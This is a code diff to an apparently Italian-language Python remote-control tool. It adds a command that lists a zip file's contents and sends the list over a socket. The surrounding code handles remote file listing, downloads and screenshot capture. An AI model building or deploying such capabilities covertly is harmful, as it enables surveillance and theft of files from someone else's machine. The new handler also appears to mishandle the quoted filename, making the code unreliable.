@@ -132,8 +132,10 @@ def filespath(tipologia, client):
                             zf = zipfile.ZipFile(item, 'r')
                             os.chdir(pathcurrent)
                             for item2 in zf.namelist():
-                                result.append('\t-: "' + item2 + '"')
-                            result.append("\n")
+                                result.append("\n\t-:" + '"' + item2 + '"')
+
+                            result.append("\n\n")
+
                         else:
                             counter_elemets += 1
                             result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
@@ -304,6 +306,44 @@ def download(comando, client):
             os.chdir(pathtoremember)
 
 
+#aprire i file
+def openZip(comando,client):
+
+    result=[]
+    if comando.endswith(".zip"):
+        try:
+            nomeFile = comando[5:]
+            result.append(f"\n {nomeFile} contiene i seguenti file:\n ")
+            zf = zipfile.ZipFile(nomeFile, 'r')
+            for item2 in zf.namelist():
+                result.append("\n\t-:" + '"' + item2 + '"')
+                print("\n\t-:" + '"' + item2 + '"')
+
+            result = ''.join(result)
+
+            try:
+                encode = result.encode(FORMAT)
+                x = 1024
+                y = x + 1024
+
+                line = encode[0:1024]
+                client.send(line)
+                while (line):
+                    line = encode[x:y]
+                    client.send(line)
+                    x = x + 1024
+                    y = x + 1024
+
+                time.sleep(2)
+                client.send(("[END]").encode(FORMAT))
+            except:
+                raise Exception
+        except:
+            client.send(("[ERROR]").encode(FORMAT))
+
+        time.sleep(5)
+
+
 # funzione di remote control
 def openRemoteControl(client):
     comando = "null"
@@ -446,6 +486,14 @@ def openRemoteControl(client):
 
                 os.remove("screen.png")
                 time.sleep(5)
+
+            elif comando[0:4]=="open":
+                regex = r'^open \"[a-zA-Z0-9, ,\_,\-,\.,\']+\.zip\"'
+                if re.match(regex, comando):
+                    openZip(comando,client)
+                else:
+                    pass
+
             else:
                 pass
 
